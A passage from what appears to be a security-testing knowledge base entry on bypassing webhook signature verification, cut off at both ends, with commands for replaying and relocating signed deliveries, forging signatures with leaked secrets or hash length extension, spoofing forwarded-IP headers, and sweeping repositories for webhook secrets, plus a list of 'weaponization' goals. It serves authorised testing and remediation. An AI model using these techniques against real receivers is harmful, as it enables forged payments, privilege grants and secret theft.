          { code: 'curl -i -X POST https://target/webhooks/stripe -H "Content-Type: application/json" --data-binary @body.json', note: 'No signature header at all. Acceptance means verification is conditional on the header being present.' },
          { code: 'curl -i -X POST https://target/webhooks/github -H "X-Hub-Signature-256: " --data-binary @body.json', note: 'Empty header value. Some verifiers treat an empty string as nothing to check.' },
          { code: 'curl -i -X POST https://target/webhooks/github -H "X-Hub-Signature-256: sha256=00000000000000000000000000000000000000000000000000000000000000ff" --data-binary @body.json', note: 'Well formed but wrong. This is your control: it must be rejected.' },
          { code: 'Replay a genuine capture with one digit changed in the body, original signature untouched.', note: 'Acceptance proves the signature is parsed but never compared against the payload.' },
        ],
      },
      {
        heading: 'Know the scheme before you attack it',
        body: [
          'You cannot test a verifier without being able to compute what it expects. The schemes differ in exactly the ways that matter, so learn the one in front of you rather than assuming. In particular note what is inside the signed string: body only, body plus timestamp, or body plus timestamp plus an identifier, and whether the URL is in there at all.',
          'GitHub sends X-Hub-Signature-256 holding the literal prefix sha256= followed by the hex HMAC-SHA256 of the raw body under the webhook secret. There is no timestamp in the signed data and no URL. The older X-Hub-Signature carries HMAC-SHA1 and is documented as kept for legacy purposes only. Freshness is left entirely to you, using the X-GitHub-Delivery uuid as a dedupe key.',
          'Stripe sends Stripe-Signature as a comma separated list of prefix=value pairs: t= for the unix timestamp, v1= for the hex HMAC-SHA256, and on test events an extra v0= with a deliberately fake scheme. The signed payload is the timestamp, then a literal dot, then the raw body. Stripe tells implementers to ignore every scheme that is not v1 specifically to prevent downgrade attacks, and their libraries default to a five minute tolerance which they warn must never be set to 0 because that disables the recency check entirely.',
          'Slack sends X-Slack-Signature holding v0= plus a hex HMAC-SHA256 over the base string "v0:" + timestamp + ":" + raw body, with the timestamp in a separate X-Slack-Request-Timestamp header, and recommends rejecting anything more than five minutes off local time. Shopify sends X-Shopify-Hmac-SHA256 as a base64 HMAC-SHA256 of the raw body only, keyed by the app client secret. Discord interactions use Ed25519 rather than an HMAC: X-Signature-Ed25519 plus X-Signature-Timestamp, verified over the timestamp concatenated with the body against the public key from the developer portal, and Discord actively sends deliberately invalid signatures to confirm you answer 401.',
          'The Standard Webhooks specification, which Svix and several products implement, uses webhook-id, webhook-timestamp, and webhook-signature, signing the string id + "." + timestamp + "." + body. The signature header is a space delimited list so that secrets can be rotated with two active at once, and each entry is version,base64 where v1 is HMAC-SHA256 and v1a is Ed25519. Secrets carry whsec_, private keys whsk_, public keys whpk_.',
          'Twilio is the outlier worth knowing because it binds the URL: X-Twilio-Signature is a base64 HMAC-SHA1 over the full request URL including scheme, port, and query string, with form POST parameters sorted by name and their names and values concatenated onto it with no delimiter. For JSON bodies Twilio instead adds a bodySHA256 query parameter holding the hex SHA-256 of the body and signs the URL containing it. Almost nobody else signs the path, and that gap is the subject of the next section.',
        ],
        examples: [
          { code: 'python3 -c "import hmac,hashlib,sys;b=open(sys.argv[1],\'rb\').read();print(\'sha256=\'+hmac.new(sys.argv[2].encode(),b,hashlib.sha256).hexdigest())" body.json SECRET', note: 'GitHub style signature over the raw body. Once you hold the secret this is the whole attack.' },
          { code: 'python3 -c "import hmac,hashlib,time,sys;b=open(sys.argv[1],\'rb\').read();t=str(int(time.time()));print(\'t=\'+t+\',v1=\'+hmac.new(sys.argv[2].encode(),t.encode()+b\'.\'+b,hashlib.sha256).hexdigest())" body.json whsec_XXXX', note: 'Stripe style: timestamp, dot, raw body. Generating a fresh timestamp defeats any tolerance check.' },
          { code: 'basestring = "v0:" + timestamp + ":" + raw_body    then    "v0=" + hmac_sha256_hex(signing_secret, basestring)', note: 'Slack construction. Note the colons are literal and the body is used verbatim.' },
          { code: 'signed = webhook_id + "." + webhook_timestamp + "." + raw_body   then   "v1," + base64(hmac_sha256(secret, signed))', note: 'Standard Webhooks. The id in the signed string is what makes replay detection possible at all.' },
        ],
      },
      {
        heading: 'Replay and scope: what the signature does not cover',
        body: [
          'A signature over the body alone says nothing about when, where, or how many times. Three separate tests fall out of that, and all three work against a receiver whose HMAC code is perfect.',
          'Freshness. If the scheme signs no timestamp, as GitHub does not, a captured delivery is valid forever, so replaying last month\'s capture is a live attack unless the receiver dedupes on the delivery identifier. If the scheme does sign a timestamp, the receiver still has to check it: the timestamp is only authenticated, not enforced. Test by taking a genuine capture and replaying it unmodified hours or days later. Then test the dedupe layer separately by replaying a fresh, fully valid delivery ten times and looking for ten effects. Providers explicitly warn that duplicate deliveries happen naturally, so a handler that is not idempotent is a bug even before an attacker shows up.',
          'Location. Because the path, the query string, the host, and usually the method are outside the signed string, a body that is genuinely signed for one route is equally valid at every other route that verifies with the same secret. Enumerate the routes and replay the same signed body at each. Then append query parameters that the handler reads, since they were never covered by the signature. Then try the same signed body against the staging host, the legacy versioned path, and the trailing slash variant.',
          'Endpoint confusion is the sharp version of this. Applications commonly mount several handlers for one provider under one secret: one for payments, one for refunds, one for account updates, one kept around for an older API version with looser validation. A signed event that is uninteresting on its intended route may be devastating on another, and you did not have to forge anything to get it there.',
          'Method and content type are also unsigned. If the router accepts the same path under PUT or PATCH, or if the app dispatches on a Content-Type you can change while leaving the bytes identical, the signature still validates over bytes that now reach different code.',
        ],
        examples: [
          { code: 'Replay a capture from days ago, unmodified, headers and all.', note: 'Success proves no timestamp check, or no timestamp in the signed string at all.' },
          { code: 'Send the same fully valid delivery 10 times and count the side effects.', note: 'Missing idempotency on X-GitHub-Delivery, the Stripe event id, or webhook-id.' },
          { code: 'Same signed body, different route: /webhooks/stripe -> /webhooks/stripe-legacy, /api/v1/webhooks/stripe, /webhooks/stripe/', note: 'The path is not in the signed payload for GitHub, Stripe, Slack, or Shopify.' },
          { code: 'POST /webhooks/provider?tenant=victim&env=prod   with the original body and its original signature', note: 'Query parameters the handler reads are attacker controlled even under a perfect signature.' },
          { code: 'Replay the signed body with Host: staging.target.tld', note: 'Shared secrets across environments make staging captures live against production and back.' },
        ],
      },
      {
        heading: 'Comparison, parsing, and algorithm selection flaws',
        body: [
          'Once you know the check runs, attack how it decides. Start with the comparison. A plain equality operator returns on the first differing byte, which leaks the expected value through response time. Both GitHub and Shopify document this explicitly and tell implementers never to use a plain == and to use secure_compare, crypto.timingSafeEqual, or hmac.compare_digest instead. A recent example is the pay gem (pay-rails/pay, versions up to and including 11.6.1), where Pay::Webhooks::PaddleBillingController#valid_signature? compared the computed HMAC hex digest to the supplied value with Ruby\'s native String#== and produced a per byte timing side channel. Note it is the Ruby integration gem, not Paddle\'s own SDK, so search for the gem rather than for Paddle. Be honest in a report about exploitability: recovering a 64 hex character digest across the public internet needs a very large number of requests and very low jitter, so it is usually written up as a defect with a demonstrated timing delta rather than a recovered signature, and it becomes genuinely practical only on a low latency path such as a colocated service or an internal API.',
          'Truncated comparison is far more exploitable and much less discussed. If the code compares only a prefix, whether by slicing both values, by using startswith, or by an accidental substring test, the effective search space collapses to sixteen to the power of the number of hex characters actually compared. Six hex characters is around sixteen million candidates and four is sixty five thousand, which is brute forceable online in minutes against a receiver with no rate limit. Determine the compared length empirically: append junk to a valid signature, truncate a valid signature progressively, and see where acceptance stops.',
          'Substring tests are their own bug. A check written as expected in provided passes for any string containing the expected value, so you can pad. A check written as provided in expected passes for the empty string and for any prefix, which is why the empty header test from the enforcement ladder is worth repeating here with an eye on the code.',
          'Then attack the parsing. Stripe\'s header is a comma separated list of prefix=value pairs and can legitimately carry several v1 entries during a secret rotation, plus a fake v0 on test events. A verifier that loops over every element and accepts on any match, or that splits on the first = and takes whatever value follows, or that does not pin the scheme to v1, is what Stripe means when it says to ignore all schemes that are not v1 in order to prevent downgrade attacks. The Standard Webhooks header is a space delimited list for the same rotation reason and has the same any-match hazard. Clerk\'s verifyWebhook is a nearby case worth reading: applications could accept improperly signed webhook events until it was fixed by properly parsing the request signatures and comparing them against the generated one (CVE-2025-53548, affecting @clerk/backend 2.0.0 up to 2.4.0 and the matching Next.js, Express, and Fastify wrappers). The advisory does not say which of the parsing defects above it actually was, so test for all of them rather than assuming it was the any-match loop.',
          'Finally, check whether the verifier takes the primitive from the request. If the header format is prefix=digest and the code maps that prefix to a hash function, the attacker chooses the algorithm. That alone does not forge anything, since every choice still needs the secret, but two variants do bite. First, an unknown or unsupported algorithm name that makes the hashing call throw, where the exception is caught by a handler that continues rather than rejects. Second, a scheme selector that switches between a symmetric and an asymmetric primitive, such as Standard Webhooks v1 (HMAC-SHA256) versus v1a (Ed25519): a verifier that can be steered to treat the published verification key as an HMAC secret is the webhook form of JWT algorithm confusion, and the public key is by definition public. The mechanics of that confusion are covered in the JWT Attacks entry and are not repeated here.',
          'And check whether the result is used. A verify call whose boolean return value is computed and discarded, or wrapped in a try block whose catch logs a warning and falls through to the handler, is a common and completely silent failure. It is worth grepping for directly.',
        ],
        examples: [
          { code: 'rg -n "== *(expected|computed|signature)|signature *==|\\.startswith\\(|hexdigest\\(\\) *=="', note: 'Non constant time and prefix comparisons. Compare against compare_digest, timingSafeEqual, secure_compare.' },
          { code: 'Truncation probe: send valid_sig[:N] for N = 64, 48, 32, 16, 8, 6, 4 and find the shortest accepted.', note: 'The shortest accepted prefix is your online brute force exponent.' },
          { code: 'Padding probe: send valid_sig + "AAAA" and "AAAA" + valid_sig.', note: 'Acceptance of either indicates a substring or startswith test rather than equality.' },
          { code: 'Stripe-Signature: t=<now>,v0=<anything>,v1=<anything>   and   t=<now>,v1=<good>,v1=<garbage>', note: 'Scheme pinning and multi-signature parsing. Any-match logic accepts the list if one entry is right.' },
          { code: 'X-Hub-Signature: sha1=<hex>   sent alongside or instead of X-Hub-Signature-256', note: 'Does the receiver still honour the legacy header, and does it prefer the weaker one when both are present.' },
          { code: 'rg -n -A3 "verif(y|ication)|constructEvent|validateSignature" | rg -n "catch|warn|console\\.log"', note: 'Verification whose failure path logs and continues instead of returning an error.' },
        ],
      },
      {
        heading: 'Raw body versus re-serialised body',
        body: [
          'Every provider signs the exact bytes on the wire. Stripe states that any manipulation of the raw body causes verification to fail and lists frameworks that mutate it by default. GitHub warns that payloads contain unicode and must be handled as UTF-8 without modification. Shopify says outright that HMAC verification requires the raw request body and that a body parser running before your verification code breaks it. The bug is that web frameworks parse JSON automatically, and a developer who then signs a re-serialised copy of the parsed object is signing a different byte string.',
          'The first-order consequence is that verification always fails, which sounds fail-closed and safe. It is not, because of what teams do next. The signature never matches, someone cannot work out why, and the fix that ships is a conditional that skips verification, a try block that swallows the error, or an environment flag that disables the check in production. Every one of those is found by the enforcement ladder in the earlier section, so when you see the enforcement bug, look for the re-serialisation bug behind it and report the root cause.',
          'The second-order consequence matters when the round trip happens to succeed. Verifying over a canonical re-serialisation converts byte-exact integrity into equivalence-class integrity: any byte string that parses to the same object now passes with a captured signature. Insignificant whitespace, a slash written as an escaped slash, an ASCII character written as a unicode escape, and an integer written in exponent notation all survive parse-then-stringify as the same canonical output. That alone does not let you change a value, but it proves the canonicalisation, and it creates a real differential wherever the handler, a queue consumer, or a forwarded copy reads the original raw bytes rather than the parsed object, because verification and consumption are then looking at different data.',
          'In an Express codebase the signature of the bug is app.use(express.json()) mounted before the webhook route, plus a verifier that hashes JSON.stringify(req.body). The correct shapes are express.raw({ type: "application/json" }) on the webhook route only, or express.json({ verify: (req, res, buf) => { req.rawBody = buf } }) so the untouched buffer is preserved for hashing. Stripe documents this ordering trap directly: express.json() must come after the webhook route. In Next.js the equivalents are disabling the pages router bodyParser and buffering the request, or calling await req.text() in an app router route handler.',
          'In Rails the correct source is request.raw_post, which rewinds and returns the untouched body. The bug is hashing params.to_json or request.request_parameters.to_json. Rails makes that especially obvious because it injects :controller and :action into params, so params.to_json can never match a sender-computed digest, and wrap_parameters can add a nested duplicate of the whole payload under the model name. Also watch for request.body.read being called twice, where the second read returns an empty string because the stream was already consumed, producing an HMAC over nothing.',
          'Two infrastructure variants complete the picture. On AWS API Gateway with Lambda proxy integration the body arrives as a string and may be base64 encoded depending on isBase64Encoded and the binary media type settings, so decoding with the wrong assumption mangles multibyte characters. And any body rewriting sits upstream of all of this: a WAF that normalises unicode, a proxy that re-chunks or re-encodes, or a gateway that pretty-prints JSON will break verification for exactly the same reason and push the team toward the same unsafe fix.',
        ],
        examples: [
          { code: 'rg -n "JSON.stringify\\(req.body\\)|JSON.stringify\\(request.body\\)" --glob "!node_modules"', note: 'Node: hashing a re-serialised object instead of the raw bytes.' },
          { code: 'rg -n "express.json\\(\\)|bodyParser.json\\(\\)" -B5 -A15 | rg -n "webhook"', note: 'Node: check whether the parser is mounted before the webhook route.' },
          { code: 'rg -n "express.raw\\(|verify: *\\(req|rawBody"', note: 'Node: confirm the correct raw-body-preserving shapes are actually used on that route.' },
          { code: 'rg -n "params.to_json|request.request_parameters|request.body.read|raw_post" app/controllers', note: 'Rails: raw_post is right, params.to_json is the bug, a second body.read returns empty.' },
          { code: 'Canonicalisation probe: resend a captured body with an extra space after a colon, or 1e2 in place of 100, keeping the original signature.', note: 'Acceptance proves verification runs over a re-serialised copy, not the wire bytes.' },
        ],
      },
      {
        heading: 'Getting the secret instead of breaking the crypto',
        body: [
          'If you hold the signing secret, every section above becomes unnecessary: you sign whatever you like and the receiver is correct to accept it. Because these secrets are long lived, rarely rotated, shared between services, and needed by both build and runtime, they leak constantly. Search for them the way you would any credential, but with the right prefixes.',
          'Stripe endpoint secrets begin with whsec_, and Standard Webhooks uses whsec_, whsk_, and whpk_. Environment variable names to grep are SLACK_SIGNING_SECRET, SHOPIFY_API_SECRET, GITHUB_WEBHOOK_SECRET, TWILIO_AUTH_TOKEN, STRIPE_WEBHOOK_SECRET, and the generic WEBHOOK_SECRET. Look in committed .env files, docker-compose.yml, Kubernetes manifests and Helm values, CI configuration and build logs, Terraform state, Postman collections, serverless configuration, published container image layers, and, more often than it should be, the client-side JavaScript bundle of a dashboard that was built with the wrong environment variable prefix.',
          'Test keys are the underrated path. The Stripe CLI prints a signing secret when you run stripe listen, and Stripe warns that events forwarded by the CLI must not be verified with a Dashboard endpoint secret or the reverse. That CLI secret ends up committed constantly. The bug worth reporting is a receiver that accepts either the test-mode or the live-mode secret, because the low value secret then signs production-looking events.',
          'Scope is the other half. If one secret covers staging and production, a capture or a leak in the weaker environment is a forgery capability in the stronger one. If one secret covers every tenant of a multi-tenant integration, a valid signature proves the provider sent something, not which customer it concerns, so the tenant field in the body needs its own authorization check. Ask explicitly during a review: how many distinct secrets exist, and what does each one authorise.',
          'And sometimes the provider leaks it for you. Between 11 September 2025 and 26 January 2026 a bug in GitHub\'s webhook delivery platform included the repository webhook secret in an X-Github-Encoded-Secret request header on deliveries, disclosed to affected users in April 2026. Two testable consequences follow: any receiver that logs full request headers now has other people\'s signing secrets sitting in its log store, and anyone with read access to those logs can forge deliveries. Grep your own header logs, APM traces, and error reports for that header name, and treat "we log the full request for debugging" on a webhook route as a finding in its own right.',
        ],
        examples: [
          { code: 'rg -n "whsec_|whsk_|whpk_|SIGNING_SECRET|WEBHOOK_SECRET|SHOPIFY_API_SECRET|TWILIO_AUTH_TOKEN"', note: 'Prefix and variable name sweep across a repository, its history, and its build artefacts.' },
          { code: 'git log -p --all -S "whsec_" | head -100', note: 'A secret deleted from the working tree is still in the history and still valid unless it was rotated.' },
          { code: 'rg -n "x-github-encoded-secret|X-Github-Encoded-Secret" /var/log  and in your APM and error tracker', note: 'The 2025 to 2026 GitHub delivery bug put secrets in a request header that many receivers logged.' },
          { code: 'Sign with a test-mode or CLI secret and send to the production endpoint.', note: 'Acceptance means the receiver does not pin the secret to the environment it belongs to.' },
        ],
      },
      {
        heading: 'Hash length extension against H(secret || message)',
        body: [
          'Some in-house schemes never use HMAC at all. They compute a "signature" as a plain hash of the secret concatenated with the message, and that construction is forgeable without the secret when the hash is a Merkle-Damgard design, which covers MD5, SHA-1, SHA-256, and SHA-512. The digest of such a hash is literally the internal state after the last block, so you can load it back into the compression function and keep hashing. Given the message, its signature, the algorithm, and the byte length of the secret, you produce a valid signature for message plus padding plus anything you choose, and you never learn the secret.',
          'The padding maths is what makes it exact. For MD5, SHA-1, and SHA-256 the block is 64 bytes: append one 0x80 byte, then 0x00 bytes until the total length is congruent to 56 modulo 64, then an 8 byte field holding the bit length of secret plus message. MD5 writes that length field little-endian; SHA-1 and SHA-256 write it big-endian. SHA-512 uses 128 byte blocks, pads to 112 modulo 128, and uses a 16 byte big-endian length field. You do not know the secret, but you only need its length, so brute force it from 1 to 64 and try each candidate against the endpoint.',
          'Know precisely where this does not apply, because the mistake in both directions is common. It does not work against HMAC, which was designed specifically to stop it, so HMAC-SHA256 and even HMAC-MD5 are immune. It does not work against the truncated SHA-2 variants SHA-224, SHA-384, and SHA-512/256, because the published digest is not the full internal state. It does not work against SHA-3, BLAKE2, or KMAC. And it does not work against H(message || secret), which is not extendable, though that construction has its own problems.',
          'The receiver also has to tolerate the padding bytes, which land in the middle of your message. That is why the canonical real-world case worked: Flickr\'s API signature, broken by Thai Duong and Juliano Rizzo in 2009, was MD5 of the secret followed by the sorted parameter names and values concatenated with no separators, so the 0x80 and NUL bytes fell harmlessly inside a parameter value and the parameters appended after them parsed normally, allowing forged API calls on behalf of any Flickr application. A modern JSON receiver usually rejects a body containing those bytes outright, so length extension against a JSON webhook is rarely live. Where it still is: query string and form encoded signed APIs where you can percent-encode the padding, legacy internal service-to-service signing, mobile app to backend signatures, and licence or activation checks.',
          'Recognise the target by shape. The signature is exactly 32, 40, or 64 hex characters; no SDK or document mentions HMAC anywhere; the documentation says something like "MD5 of your secret key followed by the parameters in alphabetical order"; and repeated parameters, appended parameters, or last-wins parsing exist in the receiver so that your appended data actually overrides something. Get one valid pair from the most harmless call you can make, then let the tool sweep the secret length.',
        ],
        examples: [
          { code: './hash_extender --data "user=guest&role=user" --secret 16 --append "&role=admin" --signature SIG --format sha256', note: 'Forge a signature for the extended message with a known secret length. Prints the new signature and the new byte string.' },
          { code: './hash_extender --data "user=guest&role=user" --append "&role=admin" --signature SIG --format sha256 --secret-min 1 --secret-max 64', note: 'Sweep every plausible secret length and try each candidate against the endpoint.' },
          { code: 'hashpump -s 6d5f807e23db210bc254a28be2d6759a0f5f5d99 -d "count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo" -a "&waffle=liege" -k 14', note: 'The canonical HashPump example: -s signature, -d data, -a additional, -k secret length in bytes.' },
          { code: 'Percent-encode the padding when sending it in a URL or form body: 0x80 becomes %80 and each 0x00 becomes %00.', note: 'The forged message contains raw padding bytes, so it must survive transport and the receiver parser.' },
          { code: 'Verify with the MD5 example output: data 64617461, then 80, zeros, then 5000000000000000.', note: '0x50 little-endian is 80 bits, which is the 10 bytes of a 6 byte secret plus the 4 byte message. That is the maths, checkable by hand.' },
        ],
      },
      {
        heading: 'Where MD5 and SHA-1 collisions matter, and where they do not',
        body: [
          'A collision is two different inputs with the same digest. MD5 chosen-prefix collisions are cheap, and a SHA-1 chosen-prefix collision was demonstrated by Leurent and Peyrin in 2020 at roughly forty five thousand dollars of GPU time, with the cost falling since. That sounds like it should break webhook signatures. In almost every case it does not, and getting this wrong in a report will cost you credibility.',
          'Collisions matter where you can get a trusted party to sign or vouch for content you supply, and then substitute the colliding twin afterwards. Certificates, signed update manifests, signed documents, and code signing are the real targets. The attacker must control both messages, which is the point people skip.',
          'Collisions do not let you forge a signature for a message when all you have is somebody else\'s signed message, which is the webhook situation. More importantly, they do not break HMAC. HMAC\'s security argument does not rest on collision resistance of the underlying hash, so HMAC-MD5 and HMAC-SHA1 are not forgeable by a collision attack, and GitHub\'s legacy HMAC-SHA1 X-Hub-Signature is not forgeable that way either. Report the legacy header as a weakness on the correct grounds: it is deprecated, and a receiver that still honours it or that prefers it when both headers are present has a comparison and selection defect, not a broken cipher.',
          'Where collisions do reach this attack class is against the naive constructions in the previous section rather than against HMAC. A scheme computing H(message || secret) is not length extendable, but a collision in the message portion produces two messages with the same signature under any secret, which is a genuine forgery primitive if you can get one of them signed.',
          'JWT algorithm confusion, alg none, and attacker-supplied key references belong to the JWT Attacks entry. They apply unchanged whenever a provider authenticates itself with a signed JWT in a header instead of an HMAC over the body, and that entry covers the mechanics.',
        ],
        examples: [
          { code: 'Fingerprint the construction: is the SDK calling hmac.new / createHmac / OpenSSL::HMAC, or plain md5 / sha1 / sha256 of a concatenation?', note: 'This single question decides whether length extension and collision arguments are relevant at all.' },
          { code: 'Digest length tells you the family: 32 hex = MD5, 40 = SHA-1, 64 = SHA-256, 128 = SHA-512.', note: 'Length alone does not distinguish a plain hash from an HMAC of the same hash, so read the code or the docs.' },
        ],
      },
      {
        heading: 'Verify by callback, IP allow-lists, and other non-signature controls',
        body: [
          'Some receivers verify by fetching something the message told them to fetch. That inverts the trust relationship, because the message now names its own authority. The clearest recent case is ex_aws_sns, where verify_message/1 fetched the signing certificate from the SigningCertURL field of the incoming SNS message without checking that the URL used HTTPS or that the host belonged to AWS. An unauthenticated attacker could sign a forged SNS message with their own RSA key, point SigningCertURL at their own server, and have verification return :ok (CVE-2026-47074, GHSA-8jgf-23q5-x7xx, versions 2.0.1 through 2.3.4, fixed in 2.3.5). AWS\'s own rule is that the certificate URL must be an AWS SNS domain for the region.',
          'The same shape appears as: auto-confirming an SNS SubscribeURL taken from the body, which hands topic delivery to an attacker; fetching "the full event" from a self-link inside the payload rather than from the provider API using only the event id; and any design phrased as "we call you back to confirm". Test all of them by substituting a collaborator host and watching for the fetch. These are simultaneously SSRF, so pair the finding with the SSRF entry, but the signature bypass is the higher severity half.',
          'IP allow-lists are a defence in depth control that is regularly deployed as the only control. Stripe publishes its webhook egress addresses and recommends allow-listing in addition to signature verification, not instead of it. Three bypasses to test. First, any SSRF elsewhere in the application makes the request originate from the application itself, which is usually trusted. Second, shared cloud egress ranges mean that allow-listing a provider\'s cloud provider allow-lists everyone with an account there. Third, and most common, the app reads the client address from a forwarded header without pinning to the entry its own trusted proxy appended, so you simply state the address you want.',
          'The other weak substitutes are worth naming because they are so common. A secret in the URL path, as in /webhooks/long-random-string, leaks through referrers, proxy and CDN logs, browser history, error pages, and CI output, and never expires. A check on the User-Agent, for example that it equals GitHub-Hookshot, is a header you can type. A shared bearer token in a query parameter has the same leak profile as a secret in the path. Absence of any of these is not the finding; presence of only these is.',
          'The controls that do hold up, and that are the right remediation to recommend, are: verify the signature over the raw bytes with a constant time comparison, pin the scheme, enforce the timestamp window, dedupe on the delivery identifier, use a distinct secret per endpoint and per environment, and authorize the tenant identifier in the payload separately from the signature. Mutual TLS and provider-signed JWTs are also strong, with the caveat that a provider JWT puts you squarely back in the JWT Attacks entry.',
        ],
        examples: [
          { code: 'Set SigningCertURL (or any key, cert, or self-link URL in the payload) to https://COLLAB.oastify.com/cert.pem and watch for the fetch.', note: 'A callback proves the receiver takes its verification authority from the message.' },
          { code: 'X-Forwarded-For: 3.18.12.63    X-Real-IP: 3.18.12.63    CF-Connecting-IP: 3.18.12.63    True-Client-IP: 3.18.12.63', note: 'Claim a documented provider address when the allow-list reads a forwarded header it does not control.' },
          { code: 'Send with User-Agent: GitHub-Hookshot/044aadd and no signature header.', note: 'Tests whether a User-Agent string is standing in for authentication.' },
          { code: 'Check whether the webhook path itself is the secret, then look for it in referrer logs, CDN access logs, and CI output.', note: 'A path secret cannot be rotated without redeploying every sender and leaks through infrastructure you do not control.' },
        ],
      },
      {
        heading: 'Tools and workflow',
        body: [
          'Work in this order, because each step is cheap and rules out the next. Obtain one genuine signed delivery. Establish whether verification runs at all using the enforcement ladder. Establish what the signed string covers by reading the provider documentation. Then attack freshness, then location, then comparison and parsing, then the raw body handling, then the secret, and only then reach for length extension. In practice the majority of real findings are settled in the first two steps.',
          'For capture and replay, the provider dashboards are better than a proxy because they give you the exact headers alongside a resend button. Beyond that, an intercepting proxy plus a small signing script per provider is the whole toolkit: once you can compute a signature you can iterate freely, and once you cannot, everything reduces to replaying and relocating captures. Keep a saved request in your proxy repeater and mutate exactly one thing per send, because these bugs are distinguished by which single change flips acceptance.',
          'For source review, the grep patterns in the raw body and comparison sections find most of it. Add one more sweep for the verification call sites themselves and read each one for four things in order: does it use the raw bytes, does it compare in constant time, does it pin the scheme, and does a failure return before the handler runs.',
          'For the naive constructions, hash_extender and HashPump both automate the padding and state reload. hash_extender takes --data, --signature, --format, and either --secret for a known length or --secret-min and --secret-max to sweep. HashPump takes -d for the data, -s for the signature, -a for the data to append, and -k for the secret length in bytes. Both print the new signature and the new message bytes; the message bytes are the part you have to get through the receiver intact.',
        ],
        examples: [
          { code: 'stripe events resend evt_XXXX --webhook-endpoint=we_XXXX', note: 'Replay a genuine Stripe delivery, valid for up to 30 days after the event, to study or to test idempotency.' },
          { code: 'curl -s -X POST https://target/hooks/x -H "Content-Type: application/json" -H "X-Hub-Signature-256: sha256=$SIG" --data-binary @body.json -w " %{http_code} %{time_total}"', note: 'Base replay command. The timing output is also your timing side channel measurement.' },
          { code: 'for p in /webhooks/stripe /webhooks/stripe/ /api/v1/webhooks/stripe /hooks/stripe; do curl -s -o /dev/null -w "$p %{http_code}\\n" -X POST "https://target$p" -H "Stripe-Signature: $SIG" --data-binary @body.json; done', note: 'Relocate one genuinely signed body across every route that might share the secret.' },
          { code: 'ffuf -u https://target/FUZZ -X POST -d @body.json -H "Content-Type: application/json" -w webhook-paths.txt -mc all -ac', note: 'Discover receiver routes before relocating a capture to them.' },
          { code: 'Report checklist: raw bytes, constant time, scheme pinned, timestamp enforced, delivery id deduped, secret per endpoint and environment, tenant authorized.', note: 'Seven questions that separate a correct verifier from one that only looks correct.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Send a fully forged event as the provider when the receiver never verifies at all, or verifies only when the signature header happens to be present, so an absent header is treated as nothing to check.',
          'Sign arbitrary events as the provider using a signing secret recovered from a committed .env, git history, a CI log, a client bundle, a container layer, or a provider side leak such as the GitHub deliveries that carried the secret in an X-Github-Encoded-Secret header.',
          'Sign production-looking events with a test-mode or CLI signing secret when the receiver does not pin the secret to its environment.',
          'Replay a genuine captured delivery so the receiver believes the provider sent it again, indefinitely where the scheme signs no timestamp and forever where the receiver never checks the one it was given.',
          'Relocate a genuine signed body to a different route, host, or environment that shares the secret, so the receiver believes the provider sent that event to that endpoint, since path, query, host, and method are outside the signed string in every common scheme except Twilio.',
          'Forge a signature without ever holding the secret by hash length extension against a home-grown H(secret || message) construction, becoming an authenticated API client of a signed partner, mobile, or internal service API.',
          'Point the verifier at a key you control, as with an unvalidated SigningCertURL, sign the forged message with your own key, and have verification succeed against your key rather than the provider\'s.',
          'Steer the verifier to a primitive you can satisfy: an unpinned scheme in a multi-scheme header, a downgrade to a legacy or fake scheme, or a symmetric verification path fed the published asymmetric verification key.',
          'Impersonate a specific end user or account by setting the subject, customer, email, or external id fields inside a forged or relocated event, since the handler treats those fields as provider-asserted identity.',
          'Impersonate a whole tenant, shop, workspace, or organisation by setting the tenant identifier in a payload signed with a key that covers every tenant, because the signature proves the sender and never the subject.',
          'Appear to originate from the provider by defeating an IP allow-list used as the only control: pivot through an SSRF so the request comes from the application itself, come from the same shared cloud egress range, or state the address directly in a forwarded header the app trusts.',
          'Present a sender proof that was never computed, by brute forcing a comparison that only checks a truncated prefix of the digest, or by satisfying a substring test with an empty or padded value.',
        ],
        why: 'The signature is the entire identity claim on a route that has no other authentication, so any defect that lets an arbitrary party produce, reuse, or bypass an accepted signature turns the receiver\'s notion of "the provider said this" into "anyone said this", and every identity carried inside the payload inherits that forged authority.',
      },
      tampering: {
        weaponization: [
          'Rewrite the content of events the application treats as authoritative: payment amount, currency, paid or refunded status, subscription plan, order state, inventory counts, or delivery confirmations.',
          'Append attacker-chosen parameters to a genuinely signed message using hash length extension, so the message still verifies while asking for something different, which is exactly how the Flickr API signature was broken.',
          'Change routing and target of an otherwise genuine signed body by editing the unsigned query string, path, host, or method, so the same authenticated bytes reach different code with different effects.',
          'Exploit re-serialisation verification, which converts byte-exact integrity into equivalence-class integrity, so bytes that the handler or a downstream consumer reads can differ from the bytes that were actually signed.',
          'Force a state change the application will not undo, such as a forged cancellation, suspension, chargeback, or dispute event against a victim account.',
          'Drive non-idempotent handlers by replaying one valid delivery repeatedly, duplicating rows, credits, refunds, or queued jobs where no delivery identifier is recorded.',
        ],
        why: 'The receiver skips its own validation for data it believes a trusted sender vouched for, so once the signature can be produced, replayed, or evaluated over the wrong bytes, the payload becomes unvalidated attacker input written straight into the system of record.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Forge a subscription, entitlement, plan change, or payment success event to grant yourself a paid tier, raised quota, or a feature flag that the billing webhook is the sole authority for.',
          'Forge a directory, SCIM, or identity provider event to create an account, add a member to a privileged group, or change a role, on receivers that provision from webhooks without re-checking against the provider.',
          'Forge a gate-clearing event such as email verified, phone verified, KYC approved, or invitation accepted, skipping the flow that was supposed to produce it.',
          'Relocate a genuine low-privilege signed event onto an administrative or legacy route that shares the secret and applies weaker validation.',
          'Chain a callback-based verification flaw into control of the trust anchor itself, for example auto-confirming an attacker-controlled SubscribeURL so all future messages on that topic are delivered to and re-signed by the attacker.',
        ],
        why: 'Integration webhooks are usually wired directly into provisioning and entitlement logic and run outside the normal authorization stack precisely because they are assumed to come from a trusted system, so a forged event executes a privileged operation that no user-facing path would allow.',
      },
      repudiation: {
        weaponization: [
          'Replay genuine deliveries so duplicate records appear as separate authentic events, with the receiver often recording the signed timestamp rather than the time of receipt.',
          'Destroy the provider\'s own ability to prove what it sent, because a receiver that does not record the delivery identifier alongside the verified event has no way to match its rows back to the provider\'s delivery log.',
          'Attribute financial or account actions to a victim account by placing their identifier in a forged event, so the victim is the one who has to disprove the record.',
        ],
        why: 'The verified-from-provider marker is what makes these log entries trusted and unquestioned, so forging or replaying the signature manufactures records that the system itself vouches for and cannot afterwards separate from genuine ones.',
      },
      information_disclosure: {
        weaponization: [
